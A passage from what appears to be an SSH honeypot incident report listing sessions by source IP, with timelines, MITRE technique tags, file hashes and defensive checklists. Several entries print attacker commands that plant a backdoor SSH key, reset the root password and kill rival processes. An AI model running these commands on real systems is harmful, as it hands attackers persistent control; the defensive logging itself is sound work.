| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:40:41` | `cowrie.session.connect` |
| `2026-04-16 19:40:41` | `cowrie.client.version` |
| `2026-04-16 19:40:41` | `cowrie.client.kex` |
| `2026-04-16 19:40:43` | `cowrie.login.success` |
| `2026-04-16 19:40:43` | `cowrie.session.params` |
| `2026-04-16 19:40:43` | `cowrie.command.input` |
| `2026-04-16 19:40:43` | `cowrie.command.failed` |
| `2026-04-16 19:40:44` | `cowrie.log.closed` |
| `2026-04-16 19:40:45` | `cowrie.session.params` |
| `2026-04-16 19:40:45` | `cowrie.command.input` |
| `2026-04-16 19:40:45` | `cowrie.session.file_download` |
| `2026-04-16 19:40:45` | `cowrie.log.closed` |
| `2026-04-16 19:40:55` | `cowrie.session.params` |
| `2026-04-16 19:40:55` | `cowrie.command.input` |
| `2026-04-16 19:40:55` | `cowrie.log.closed` |
| `2026-04-16 19:40:56` | `cowrie.session.params` |
| `2026-04-16 19:40:56` | `cowrie.command.input` |
| `2026-04-16 19:40:56` | `cowrie.log.closed` |
| `2026-04-16 19:40:57` | `cowrie.session.params` |
| `2026-04-16 19:40:57` | `cowrie.command.input` |
| `2026-04-16 19:40:57` | `cowrie.session.file_download` |
| `2026-04-16 19:40:57` | `cowrie.log.closed` |
| `2026-04-16 19:40:58` | `cowrie.session.params` |
| `2026-04-16 19:40:58` | `cowrie.command.input` |
| `2026-04-16 19:40:59` | `cowrie.log.closed` |
| `2026-04-16 19:40:59` | `cowrie.session.params` |
| `2026-04-16 19:40:59` | `cowrie.command.input` |
| `2026-04-16 19:41:00` | `cowrie.log.closed` |
| `2026-04-16 19:41:01` | `cowrie.session.params` |
| `2026-04-16 19:41:01` | `cowrie.command.input` |
| `2026-04-16 19:41:01` | `cowrie.command.input` |
| `2026-04-16 19:41:01` | `cowrie.log.closed` |
| `2026-04-16 19:41:02` | `cowrie.session.params` |
| `2026-04-16 19:41:02` | `cowrie.command.input` |
| `2026-04-16 19:41:02` | `cowrie.log.closed` |
| `2026-04-16 19:41:03` | `cowrie.session.params` |
| `2026-04-16 19:41:03` | `cowrie.command.input` |
| `2026-04-16 19:41:03` | `cowrie.log.closed` |
| `2026-04-16 19:41:04` | `cowrie.session.params` |
| `2026-04-16 19:41:04` | `cowrie.command.input` |
| `2026-04-16 19:41:04` | `cowrie.log.closed` |
| `2026-04-16 19:41:05` | `cowrie.session.params` |
| `2026-04-16 19:41:05` | `cowrie.command.input` |
| `2026-04-16 19:41:05` | `cowrie.log.closed` |
| `2026-04-16 19:41:06` | `cowrie.session.params` |
| `2026-04-16 19:41:06` | `cowrie.command.input` |
| `2026-04-16 19:41:07` | `cowrie.log.closed` |
| `2026-04-16 19:41:07` | `cowrie.session.params` |
| `2026-04-16 19:41:07` | `cowrie.command.input` |
| `2026-04-16 19:41:08` | `cowrie.log.closed` |
| `2026-04-16 19:41:09` | `cowrie.session.params` |
| `2026-04-16 19:41:09` | `cowrie.command.input` |
| `2026-04-16 19:41:09` | `cowrie.log.closed` |
| `2026-04-16 19:41:10` | `cowrie.session.params` |
| `2026-04-16 19:41:10` | `cowrie.command.input` |
| `2026-04-16 19:41:10` | `cowrie.log.closed` |
| `2026-04-16 19:41:11` | `cowrie.session.params` |
| `2026-04-16 19:41:11` | `cowrie.command.input` |
| `2026-04-16 19:41:11` | `cowrie.log.closed` |
| `2026-04-16 19:41:12` | `cowrie.session.params` |
| `2026-04-16 19:41:12` | `cowrie.command.input` |
| `2026-04-16 19:41:12` | `cowrie.log.closed` |
| `2026-04-16 19:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.71.192[.]108` to AbuseIPDB if not already reported
- [ ] Block `201.71.192[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-789a9471828d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:40 |
| **Last Seen** | 2026-04-16 19:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:40:46` | `cowrie.session.connect` |
| `2026-04-16 19:40:46` | `cowrie.client.version` |
| `2026-04-16 19:40:46` | `cowrie.client.kex` |
| `2026-04-16 19:40:46` | `cowrie.login.success` |
| `2026-04-16 19:40:47` | `cowrie.session.params` |
| `2026-04-16 19:40:47` | `cowrie.command.input` |
| `2026-04-16 19:40:47` | `cowrie.command.failed` |
| `2026-04-16 19:40:47` | `cowrie.log.closed` |
| `2026-04-16 19:40:47` | `cowrie.session.params` |
| `2026-04-16 19:40:47` | `cowrie.command.input` |
| `2026-04-16 19:40:47` | `cowrie.session.file_download` |
| `2026-04-16 19:40:47` | `cowrie.log.closed` |
| `2026-04-16 19:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c4ebf53e74e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:40 |
| **Last Seen** | 2026-04-16 19:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:40:49` | `cowrie.session.connect` |
| `2026-04-16 19:40:49` | `cowrie.client.version` |
| `2026-04-16 19:40:49` | `cowrie.client.kex` |
| `2026-04-16 19:40:49` | `cowrie.login.success` |
| `2026-04-16 19:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952edbdd59c3

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:41 |
| **Last Seen** | 2026-04-16 19:41 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:41:43` | `cowrie.session.connect` |
| `2026-04-16 19:41:43` | `cowrie.client.version` |
| `2026-04-16 19:41:43` | `cowrie.client.kex` |
| `2026-04-16 19:41:46` | `cowrie.login.success` |
| `2026-04-16 19:41:47` | `cowrie.session.params` |
| `2026-04-16 19:41:47` | `cowrie.command.input` |
| `2026-04-16 19:41:47` | `cowrie.command.failed` |
| `2026-04-16 19:41:48` | `cowrie.log.closed` |
| `2026-04-16 19:41:49` | `cowrie.session.params` |
| `2026-04-16 19:41:49` | `cowrie.command.input` |
| `2026-04-16 19:41:50` | `cowrie.session.file_download` |
| `2026-04-16 19:41:50` | `cowrie.log.closed` |
| `2026-04-16 19:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b4508f7425

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:41 |
| **Last Seen** | 2026-04-16 19:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:41:54` | `cowrie.session.connect` |
| `2026-04-16 19:41:55` | `cowrie.client.version` |
| `2026-04-16 19:41:56` | `cowrie.client.kex` |
| `2026-04-16 19:41:57` | `cowrie.login.success` |
| `2026-04-16 19:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e80b42d017c

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 19:42 |
| **Last Seen** | 2026-04-16 19:42 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:aqDH6tD0oFkV"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:42:14` | `cowrie.session.connect` |
| `2026-04-16 19:42:14` | `cowrie.client.version` |
| `2026-04-16 19:42:14` | `cowrie.client.kex` |
| `2026-04-16 19:42:15` | `cowrie.login.success` |
| `2026-04-16 19:42:16` | `cowrie.session.params` |
| `2026-04-16 19:42:16` | `cowrie.command.input` |
| `2026-04-16 19:42:16` | `cowrie.command.failed` |
| `2026-04-16 19:42:16` | `cowrie.log.closed` |
| `2026-04-16 19:42:17` | `cowrie.session.params` |
| `2026-04-16 19:42:17` | `cowrie.command.input` |
| `2026-04-16 19:42:17` | `cowrie.session.file_download` |
| `2026-04-16 19:42:17` | `cowrie.log.closed` |
| `2026-04-16 19:42:29` | `cowrie.session.params` |
| `2026-04-16 19:42:29` | `cowrie.command.input` |
| `2026-04-16 19:42:29` | `cowrie.log.closed` |
| `2026-04-16 19:42:30` | `cowrie.session.params` |
| `2026-04-16 19:42:30` | `cowrie.command.input` |
| `2026-04-16 19:42:30` | `cowrie.log.closed` |
| `2026-04-16 19:42:31` | `cowrie.session.params` |
| `2026-04-16 19:42:31` | `cowrie.command.input` |
| `2026-04-16 19:42:31` | `cowrie.session.file_download` |
| `2026-04-16 19:42:31` | `cowrie.log.closed` |
| `2026-04-16 19:42:31` | `cowrie.session.params` |
| `2026-04-16 19:42:31` | `cowrie.command.input` |
| `2026-04-16 19:42:32` | `cowrie.log.closed` |
| `2026-04-16 19:42:32` | `cowrie.session.params` |
| `2026-04-16 19:42:32` | `cowrie.command.input` |
| `2026-04-16 19:42:32` | `cowrie.log.closed` |
| `2026-04-16 19:42:33` | `cowrie.session.params` |
| `2026-04-16 19:42:33` | `cowrie.command.input` |
| `2026-04-16 19:42:33` | `cowrie.command.input` |
| `2026-04-16 19:42:33` | `cowrie.log.closed` |
| `2026-04-16 19:42:34` | `cowrie.session.params` |
| `2026-04-16 19:42:34` | `cowrie.command.input` |
| `2026-04-16 19:42:34` | `cowrie.log.closed` |
| `2026-04-16 19:42:35` | `cowrie.session.params` |
| `2026-04-16 19:42:35` | `cowrie.command.input` |
| `2026-04-16 19:42:35` | `cowrie.log.closed` |
| `2026-04-16 19:42:35` | `cowrie.session.params` |
| `2026-04-16 19:42:35` | `cowrie.command.input` |
| `2026-04-16 19:42:36` | `cowrie.log.closed` |
| `2026-04-16 19:42:36` | `cowrie.session.params` |
| `2026-04-16 19:42:36` | `cowrie.command.input` |
| `2026-04-16 19:42:36` | `cowrie.log.closed` |
| `2026-04-16 19:42:37` | `cowrie.session.params` |
| `2026-04-16 19:42:37` | `cowrie.command.input` |
| `2026-04-16 19:42:37` | `cowrie.log.closed` |
| `2026-04-16 19:42:38` | `cowrie.session.params` |
| `2026-04-16 19:42:38` | `cowrie.command.input` |
| `2026-04-16 19:42:38` | `cowrie.log.closed` |
| `2026-04-16 19:42:39` | `cowrie.session.params` |
| `2026-04-16 19:42:39` | `cowrie.command.input` |
| `2026-04-16 19:42:39` | `cowrie.log.closed` |
| `2026-04-16 19:42:39` | `cowrie.session.params` |
| `2026-04-16 19:42:39` | `cowrie.command.input` |
| `2026-04-16 19:42:40` | `cowrie.log.closed` |
| `2026-04-16 19:42:40` | `cowrie.session.params` |
| `2026-04-16 19:42:40` | `cowrie.command.input` |
| `2026-04-16 19:42:40` | `cowrie.log.closed` |
| `2026-04-16 19:42:41` | `cowrie.session.params` |
| `2026-04-16 19:42:41` | `cowrie.command.input` |
| `2026-04-16 19:42:41` | `cowrie.log.closed` |
| `2026-04-16 19:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4ee2361eb5

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:42 |
| **Last Seen** | 2026-04-16 19:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:42:16` | `cowrie.session.connect` |
| `2026-04-16 19:42:16` | `cowrie.client.version` |
| `2026-04-16 19:42:16` | `cowrie.client.kex` |
| `2026-04-16 19:42:17` | `cowrie.login.success` |
| `2026-04-16 19:42:17` | `cowrie.session.params` |
| `2026-04-16 19:42:17` | `cowrie.command.input` |
| `2026-04-16 19:42:17` | `cowrie.command.failed` |
| `2026-04-16 19:42:17` | `cowrie.log.closed` |
| `2026-04-16 19:42:17` | `cowrie.session.params` |
| `2026-04-16 19:42:17` | `cowrie.command.input` |
| `2026-04-16 19:42:17` | `cowrie.session.file_download` |
| `2026-04-16 19:42:17` | `cowrie.log.closed` |
| `2026-04-16 19:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b4f0f46a4a

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:42 |
| **Last Seen** | 2026-04-16 19:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:42:19` | `cowrie.session.connect` |
| `2026-04-16 19:42:19` | `cowrie.client.version` |
| `2026-04-16 19:42:19` | `cowrie.client.kex` |
| `2026-04-16 19:42:20` | `cowrie.login.success` |
| `2026-04-16 19:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87673f4624f7

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:42 |
| **Last Seen** | 2026-04-16 19:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:42:24` | `cowrie.session.connect` |
| `2026-04-16 19:42:24` | `cowrie.client.version` |
| `2026-04-16 19:42:24` | `cowrie.client.kex` |
| `2026-04-16 19:42:25` | `cowrie.login.success` |
| `2026-04-16 19:42:25` | `cowrie.session.params` |
| `2026-04-16 19:42:25` | `cowrie.command.input` |
| `2026-04-16 19:42:25` | `cowrie.command.failed` |
| `2026-04-16 19:42:25` | `cowrie.log.closed` |
| `2026-04-16 19:42:25` | `cowrie.session.params` |
| `2026-04-16 19:42:25` | `cowrie.command.input` |
| `2026-04-16 19:42:25` | `cowrie.session.file_download` |
| `2026-04-16 19:42:25` | `cowrie.log.closed` |
| `2026-04-16 19:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2869a636fc28

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:42 |
| **Last Seen** | 2026-04-16 19:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:42:27` | `cowrie.session.connect` |
| `2026-04-16 19:42:27` | `cowrie.client.version` |
| `2026-04-16 19:42:27` | `cowrie.client.kex` |
| `2026-04-16 19:42:28` | `cowrie.login.success` |
| `2026-04-16 19:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fde916bd427

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-04-16 19:43 |
| **Last Seen** | 2026-04-16 19:44 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:GUjyDbCoHcak"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:43:32` | `cowrie.session.connect` |
| `2026-04-16 19:43:32` | `cowrie.client.version` |
| `2026-04-16 19:43:32` | `cowrie.client.kex` |
| `2026-04-16 19:43:33` | `cowrie.login.success` |
| `2026-04-16 19:43:34` | `cowrie.session.params` |
| `2026-04-16 19:43:34` | `cowrie.command.input` |
| `2026-04-16 19:43:34` | `cowrie.command.failed` |
| `2026-04-16 19:43:34` | `cowrie.log.closed` |
| `2026-04-16 19:43:35` | `cowrie.session.params` |
| `2026-04-16 19:43:35` | `cowrie.command.input` |
| `2026-04-16 19:43:35` | `cowrie.session.file_download` |
| `2026-04-16 19:43:35` | `cowrie.log.closed` |
| `2026-04-16 19:43:48` | `cowrie.session.params` |
| `2026-04-16 19:43:48` | `cowrie.command.input` |
| `2026-04-16 19:43:48` | `cowrie.log.closed` |
| `2026-04-16 19:43:48` | `cowrie.session.params` |
| `2026-04-16 19:43:48` | `cowrie.command.input` |
| `2026-04-16 19:43:49` | `cowrie.log.closed` |
| `2026-04-16 19:43:49` | `cowrie.session.params` |
| `2026-04-16 19:43:49` | `cowrie.command.input` |
| `2026-04-16 19:43:50` | `cowrie.session.file_download` |
| `2026-04-16 19:43:50` | `cowrie.log.closed` |
| `2026-04-16 19:43:50` | `cowrie.session.params` |
| `2026-04-16 19:43:50` | `cowrie.command.input` |
| `2026-04-16 19:43:51` | `cowrie.log.closed` |
| `2026-04-16 19:43:51` | `cowrie.session.params` |
| `2026-04-16 19:43:51` | `cowrie.command.input` |
| `2026-04-16 19:43:51` | `cowrie.log.closed` |
| `2026-04-16 19:43:52` | `cowrie.session.params` |
| `2026-04-16 19:43:52` | `cowrie.command.input` |
| `2026-04-16 19:43:52` | `cowrie.command.input` |
| `2026-04-16 19:43:52` | `cowrie.log.closed` |
| `2026-04-16 19:43:53` | `cowrie.session.params` |
| `2026-04-16 19:43:53` | `cowrie.command.input` |
| `2026-04-16 19:43:53` | `cowrie.log.closed` |
| `2026-04-16 19:43:54` | `cowrie.session.params` |
| `2026-04-16 19:43:54` | `cowrie.command.input` |
| `2026-04-16 19:43:54` | `cowrie.log.closed` |
| `2026-04-16 19:43:55` | `cowrie.session.params` |
| `2026-04-16 19:43:55` | `cowrie.command.input` |
| `2026-04-16 19:43:55` | `cowrie.log.closed` |
| `2026-04-16 19:43:56` | `cowrie.session.params` |
| `2026-04-16 19:43:56` | `cowrie.command.input` |
| `2026-04-16 19:43:56` | `cowrie.log.closed` |
| `2026-04-16 19:43:57` | `cowrie.session.params` |
| `2026-04-16 19:43:57` | `cowrie.command.input` |
| `2026-04-16 19:43:57` | `cowrie.log.closed` |
| `2026-04-16 19:43:57` | `cowrie.session.params` |
| `2026-04-16 19:43:57` | `cowrie.command.input` |
| `2026-04-16 19:43:58` | `cowrie.log.closed` |
| `2026-04-16 19:43:58` | `cowrie.session.params` |
| `2026-04-16 19:43:58` | `cowrie.command.input` |
| `2026-04-16 19:43:59` | `cowrie.log.closed` |
| `2026-04-16 19:43:59` | `cowrie.session.params` |
| `2026-04-16 19:43:59` | `cowrie.command.input` |
| `2026-04-16 19:43:59` | `cowrie.log.closed` |
| `2026-04-16 19:44:00` | `cowrie.session.params` |
| `2026-04-16 19:44:00` | `cowrie.command.input` |
| `2026-04-16 19:44:00` | `cowrie.log.closed` |
| `2026-04-16 19:44:01` | `cowrie.session.params` |
| `2026-04-16 19:44:01` | `cowrie.command.input` |
| `2026-04-16 19:44:01` | `cowrie.log.closed` |
| `2026-04-16 19:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
